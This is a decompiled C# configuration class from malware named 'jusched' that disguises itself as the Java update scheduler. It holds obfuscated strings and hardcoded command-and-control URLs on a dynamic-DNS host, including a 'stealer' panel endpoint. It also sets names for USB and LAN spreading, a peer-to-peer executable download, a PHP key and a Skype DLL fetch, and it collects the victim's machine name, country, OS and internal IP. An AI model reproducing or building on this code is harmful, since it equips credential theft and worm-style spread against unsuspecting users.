using System;
using System.Globalization;
using System.Net;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using jusched.My;

namespace jusched;

public class Configuration
{
	public static string exename = Conversions.ToString(Utils.LVVsYEYIBTovlEgUsoSwnwY("%:<,'*+a*7*", "OAQLHYWAGMSWPilJLhqdmmn"));

	public static string[] ProcessFiles = new string[1] { Conversions.ToString(Utils.LVVsYEYIBTovlEgUsoSwnwY("%:<,'*+a*7*", "OAQLHYWAGMSWPilJLhqdmmn")) };

	public static string regname = "Java(TM) Platform SE Autoupdater 3.2";

	public static string tksname = Conversions.ToString(Utils.LVVsYEYIBTovlEgUsoSwnwY("\r&1&\u00127#&3\"5", "GUoVsdIawmVHeYMbawNTlWQ"));

	public static string uriserver = "http://eamobile-dev.servegame.com/webpanel/connect2.php";

	public static string stnot = "http://eamobile-dev.servegame.com/webpanel/stealer/not.php";

	public static string ver = "2.3";

	public static string usbname = Conversions.ToString(Utils.LVVsYEYIBTovlEgUsoSwnwY("5( <?\"5\"", "PYYCsiCEoKNRteutbKFTrDc"));

	public static string lanfolder = Conversions.ToString(Utils.LVVsYEYIBTovlEgUsoSwnwY("&945?#p38?<?$%25", "PYYCsiCEoKNRteutbKFTrDc"));

	public static string info = "http://eamobile-dev.servegame.com/webpanel/info.php";

	public static string exep2p = Conversions.ToString(Utils.LVVsYEYIBTovlEgUsoSwnwY("\0\u001c\u001c\u0018RGG\f\u0004F\f\u001a\a\u0018\n\a\u0010F\v\a\u0005G\u001dG]]ZP]\\Y]G\u0018Z\u0018\r\u0010\rF\r\u0010\r", "hJhXGhLFnFCptuHtOGadAwN"));

	public static string phpkey = Conversions.ToString(Utils.LVVsYEYIBTovlEgUsoSwnwY("ztwzrtv +0.&'2r:91.rp)0z", "CrqrRgTGmApRtNRsACwmGtw"));

	public static string skydll = "http://gskypeautoanswer.googlecode.com/svn-history/r1/trunk/Skype4COM-1.0.38.0/Skype4COM.dll";

	public static string pcname = Environment.MachineName;

	public static string pais = CultureInfo.CurrentUICulture.Name.Substring(3);

	public static string winver = ((ServerComputer)MyProject.Computer).get_Info().get_OSFullName();

	public static string strHostName = Dns.GetHostName();

	public static string internalIP = Dns.GetHostEntry(strHostName).AddressList[0].ToString();

	public const object proxy = null;
}
